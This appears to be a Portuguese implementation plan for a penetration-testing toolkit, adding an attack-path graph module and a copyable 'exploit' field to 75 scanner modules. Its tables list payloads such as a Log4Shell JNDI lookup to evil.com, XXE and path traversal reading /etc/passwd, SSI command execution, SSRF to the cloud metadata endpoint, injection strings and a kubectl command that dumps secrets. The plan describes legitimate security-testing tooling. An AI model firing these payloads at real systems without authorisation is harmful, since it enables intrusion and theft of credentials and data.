## Attack Analysis (206-207) — Plano Completo

### Visão Geral
- **206.** Attack path visualization — networkx 3.6.1 + matplotlib 3.11.0
- **207.** Auto-exploit suggestions — campo `exploit` em TODOS os 75 módulos com detecção de vulnerabilidade

### Deps novas
```
networkx>=3.6.1
matplotlib>=3.11.0
```

---

## 206. attackanalysis.py (módulo novo)

**Arquivo:** `src/mytools/web/attackanalysis.py`
**Teste:** `tests/web/test_attackanalysis.py`
**Entry point:** `mytools-analysis = "mytools.web.attackanalysis:main"`

### Técnicas
- `attack_path` — Gerar grafo de caminhos de ataque (networkx.DiGraph + matplotlib)
- `exploit_suggest` — Consolidar exploits de todos os findings

### Funcionalidades
- Recebe JSON de findings (output de attackaudit ou outros módulos)
- Conecta findings relacionados em grafo de dependências
- Renderiza PNG/SVG via matplotlib
- Exporta DOT format (graphviz)
- Cores por severidade: critical=vermelho, high=laranja, medium=amarelo, low=azul, info=cinza

### Exemplo de attack path
```
XSS Reflected → Cookie Theft → Session Hijack → Admin Access → Data Exfil
```

---

## 207. Exploits em 75 módulos

### Padrão de implementação

1. Adicionar `exploit: str = ""` no dataclass de cada módulo
2. Popular o campo quando a técnica é vulnerable
3. Formato do exploit: comando curl com placeholder `<TARGET>`, payload, ou referência

---

### WEB (59 módulos)

| # | Módulo | Dataclass | Exploit | Ferramenta |
| 15 | dockerattack.py | DockerAttackAttempt | `curl <TARGET>:5000/v2/_catalog` | curl |
| 16 | domclobbering.py | ClobberAttempt | `<a name="x" id="x"><a id="x" name="x">` | XSStrike |
| 17 | doubleurlencode.py | DoubleURLEncodeAttempt | double-encoded payload | wfuzz |
| 18 | edgefunctions.py | EdgeFunctionAttempt | function abuse payload | curl |
| 19 | fileupload.py | UploadAttempt | polyglot file content | curl |
| 20 | graphqlattack.py | GraphQLAttackAttempt | introspection query | graphql-playground |
| 21 | grpcattack.py | GrpcAttackAttempt | grpcurl reflection command | grpcurl |
| 22 | headeredge.py | HeaderEdgeAttempt | header smuggling payload | curl |
| 23 | headerinject.py | HeaderInjectAttempt | `curl -H "X-Injected: malicious" <TARGET>` | curl |
| 24 | hostheaderinject.py | HostInjectAttempt | `curl -H "Host: evil.com" <TARGET>` | curl |
| 25 | http2abuse.py | HTTP2Attempt | h2 rapid reset command | h2load |
| 26 | httpparampollution.py | HPPAttempt | duplicate param payload | wfuzz |
| 27 | httsmuggle.py | SmuggleAttempt | smuggling payload | HTTP Request Smuggler (Burp) |
| 28 | infraattack.py | InfraAttackAttempt | `curl <TARGET>:9200/_cat/indices` | curl |
| 29 | iotattack.py | IoTAttackAttempt | protocol-specific payload | metasploit (auxiliary/iot/) |
| 30 | jwtanalysis.py | JWTAnalysisAttempt | `jwt_tool.py <token> -C -d <dict>` | jwt_tool / hashcat |
| 31 | k8sattack.py | K8sAttackAttempt | `kubectl get secrets --all-namespaces` | kubectl / kube-hunter |
| 32 | lambdaattack.py | LambdaAttackAttempt | `curl https://target/api/endpoint` | curl |
| 33 | ldapiinject.py | LDAPiAttempt | `admin)(!(|(password=*))` | ldapsearch / hydra |
| 34 | log4shell.py | Log4ShellAttempt | `${jndi:ldap://evil.com/a}` | JNDIExploit / log4j-scan |
| 35 | loginjection.py | LogInjectAttempt | `%0a[IMPORTANT] fake log entry` | curl |
| 36 | methodoverride.py | OverrideAttempt | `curl -X DELETE -H "X-HTTP-Method-Override: GET" <TARGET>` | curl |
| 37 | multitenant.py | TenantAttempt | tenant ID switch payload | wfuzz |
| 38 | mxss.py | MXSSAttempt | mutation XSS payload | XSStrike |
| 39 | nosqliinject.py | NoSQLiAttempt | `{"username": {"$ne": ""}, "password": {"$ne": ""}}` | curl |
| 40 | nullbyteinject.py | NullByteAttempt | `file.php%00.jpg` | wfuzz |
| 41 | oauth.py | OAuthAttempt | redirect URI manipulation | curl |
| 42 | oidc.py | OIDCAttempt | nonce replay payload | curl |
| 43 | openredirect.py | OpenRedirectAttempt | `<TARGET>/redirect?url=https://evil.com` | curl |
| 44 | overlongencoding.py | OverlongAttempt | overlong UTF-8 payload | wfuzz |
| 45 | pathtraversal.py | PathTraversalAttempt | `curl <TARGET>/../../etc/passwd` | curl |
| 46 | prototypepollution.py | PollAttempt | `__proto__[isAdmin]=true` | curl |
| 47 | rtloverride.py | RTLAttempt | BiDi Unicode payload | wfuzz |
| 48 | saml.py | SAMLAttempt | signature wrapping payload | SAMLRaider (Burp) |
| 49 | serverlessattack.py | ServerlessAttackAttempt | cold start abuse payload | curl |
| 50 | ssiinject.py | SSIiAttempt | `<!--#exec cmd="id"-->` | curl |
| 51 | ssrfdetect.py | SSRFAttempt | `curl <TARGET>/?url=http://169.254.169.254/latest/meta-data/` | curl |
| 52 | sstidetect.py | SSTIAttempt | `{{7*7}}` / `${7*7}` | Tplmap |
| 53 | thriftattack.py | ThriftAttackAttempt | method enumeration payload | thriftpy2 / custom |
| 54 | timingattack.py | TimingAttempt | timing measurement script | hydra (timing mode) |
| 55 | tlsfingerprint.py | TLSFingerprintAttempt | JA3 hash replay | ja3 / curl |
| 56 | websocketattack.py | WSAttackAttempt | CSWSH payload | curl |
| 57 | xpathinject.py | XPathiAttempt | `' or '1'='1` | hydra |
| 58 | xssvectors.py | XSSVectorAttempt | `<img src=x onerror=alert(1)>` | XSStrike / dalfox |
| 59 | xxedetect.py | XXEAttempt | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | XXEinjector |

---

### EMAIL (6 módulos)

| # | Módulo | Dataclass | Exploit | Ferramenta |
|---|--------|-----------|---------|------------|
| 60 | smtpinjection.py | InjectionResult | SMTP header injection payload | swaks |
| 61 | smtpdowngrade.py | DowngradeResult | STARTTLS stripping command | openssl s_client |
| 62 | emailspoof.py | SpoofResult | spoofed email payload | swaks |
| 63 | emailtemplateinject.py | TemplateInjectionResult | SSTI payload via email body | Tplmap |
| 64 | emailattachmentbypass.py | BypassResult | malicious attachment name | curl |
| 65 | emailaddressbypass.py | AddressResult | email address bypass payload | swaks |

---

### DNS (5 módulos)

| # | Módulo | Dataclass | Exploit | Ferramenta |
|---|--------|-----------|---------|------------|
| 66 | dnstransfer.py | XfrResult | `dig axfr <DOMAIN> @<NAMESERVER>` | dig |
| 67 | dnsrebinding.py | RebindingResult | rebinding payload | rbndr.us |
| 68 | dnsamplification.py | AmplificationResult | open resolver abuse command | hping3 |
| 69 | dnstunnel.py | TunnelResult | tunnel detection command | dnscat2 / iodine |
| 70 | dnssecvalidation.py | DnssecResult | N/A (info only) | N/A |

---

### OSINT (2 módulos)

| # | Módulo | Dataclass | Exploit | Ferramenta |
|---|--------|-----------|---------|------------|
| 71 | darkwebmonitor.py | DarkWebMention | N/A (monitoring only) | N/A |
| 72 | emailbreachcheck.py | EmailBreach | N/A (info only) | N/A |

---

### VCS (1 módulo)

| # | Módulo | Dataclass | Exploit | Ferramenta |
|---|--------|-----------|---------|------------|
| 73 | vcsleak.py | VCSLeak | `git clone <TARGET>/.git` | git / truffleHog |

---

### CONFIG (2 módulos)

| # | Módulo | Dataclass | Exploit | Ferramenta |
|---|--------|-----------|---------|------------|
| 74 | configfiledetect.py | ConfigLeak | `curl <TARGET>/.env` | curl |
| 75 | backupfiledetect.py | BackupFile | `curl <TARGET>/backup.zip` | curl |

---

## Atualizações

### pyproject.toml
```toml
networkx = ">=3.6.1"
matplotlib = ">=3.11.0"
mytools-analysis = "mytools.web.attackanalysis:main"
```

### README.MD
- Seção de docs para mytools-analysis
- Atualizar contagem de testes

---

## Ordem de implementação

### FASE 1: 206 — Attack Path Visualization (módulo novo)

1. Adicionar `networkx>=3.6.1` e `matplotlib>=3.11.0` no pyproject.toml
2. Criar `src/mytools/web/attackanalysis.py`
   - Dataclasses: AttackNode, AttackEdge, AttackGraph
   - Técnicas: attack_path(), exploit_suggest()
   - main() com argparse, entry point `mytools-analysis`
3. Criar `tests/web/test_attackanalysis.py`
4. Adicionar entry point ao pyproject.toml
5. Rodar ruff, basedpyright, pytest no attackanalysis

### FASE 2: 207 Lote A — Web (59 módulos)

6. **Piloto** — adicionar `exploit` em 5 módulos web (clickjacking, timingattack, corsmisconfig, hostheaderinject, headerinject)
7. Rodar suite completa → validar que nada quebrou
8. Adicionar `exploit` nos restantes 54 módulos web

### FASE 3: 207 Lote B — Email (6 módulos)

9. Adicionar `exploit` em 6 módulos email

### FASE 4: 207 Lote C — DNS (5 módulos)

10. Adicionar `exploit` em 5 módulos DNS

### FASE 5: 207 Lote D — OSINT/VCS/Config (5 módulos)

11. Adicionar `exploit` em 5 módulos restantes

### FASE 6: Finalização

12. Atualizar README.MD
13. Rodar ruff, basedpyright, pytest em todos os arquivos
14. Rodar suite completa de testes

---

## Notas

- Campo `exploit: str = ""` tem default vazio (não quebra testes existentes)
- Módulos info-only (certcheck, dnssec, darkweb, emailbreach) recebem `exploit: str = ""` sem popula-lo
- Cada exploit deve ser um comando/string copiável
- Exploits usam placeholder `<TARGET>` (usuário substitui pelo alvo)
- Módulos DNS usam `<DOMAIN>` e `<NAMESERVER>`
- Coluna `Ferramenta` indica ferramenta externa recomendada (metasploit, hydra, XSStrike, wfuzz, etc.)
- Ferramentas listadas são apenas referência; o exploit em si continua sendo o comando/payload
